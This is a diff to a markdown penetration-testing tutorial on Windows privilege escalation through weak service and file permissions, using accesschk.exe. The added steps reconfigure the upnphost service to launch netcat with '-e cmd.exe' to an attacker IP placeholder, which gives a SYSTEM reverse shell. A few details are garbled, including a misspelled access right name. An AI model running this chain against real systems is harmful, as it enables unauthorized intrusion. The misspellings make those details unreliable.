@@ -101,9 +101,41 @@ C:> sc qc Sploiler
 ```
 If we upload a copy of the `accesschk.exe` binary from [Microsoft SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) we can check alot of permissions for services. For instance,
 ```
-C:> accesschk.exe -ucqv Spooler
+C:> accesschk.exe /accepteula -ucqv Spooler
 ```
 will list the Spooler service and it's permissions. To list all services, simply use an asterisk,
 ```
-C:> accesschk.exe -ucqv *
+C:> accesschk.exe /accepteula -ucqv *
 ```
+We can use it to check for write access to a service with the following DOS command,
+```
+C:> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+```
+Now, let's try it in practice. First a few things need to be in order. We must,
+1. Have a space to read and write 
+2. Upload the Windows binary of Netcat to the target `/usr/share/binaries/windows` in Kali.
+```
+C:\> sc qc upnphost
+C:\> sc config upnphost binpath= "C:\temp\nc.exe -nv (ATTACKER IP ADDRESS) (ATTACKER PORT) -e C:\WINDOWS\System32\cmd.exe"
+C:\> sc config upnphost obj= ".\LocalSystem" password= ""
+C:\> sc qc upnphost
+C:\> net start upnphost # start the service
+```
+The access rights that we are looking for in the service to fully exploit it are,
+* SERVICE_SHNAGE_CONFIG
+* WRITE_DAC
+* WRITE_OWNER
+* GENERIC_WRITE
+* GENERIC_ALL
+The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting article on the subject.
+## Weak File Permissions
+We can also use `accesschk.exe` to determine which files in the target system have weak permissions like so,
+```
+C:> accesschk.exe -uwdqs Users c:\
+C:> accesschk.exe -uwdqs "Authenticated Users" c:\
+C:> accesschk.exe -uwqs Users c:\*.*
+C:> accesschk.exe -uwqs "Authenticated Users" c:\*.*
+```
+# References
+In this document, I referenced the following resources,
+* [*http://www.fuzzysecurity.com/tutorials/16.html*](http://www.fuzzysecurity.com/tutorials/16.html)
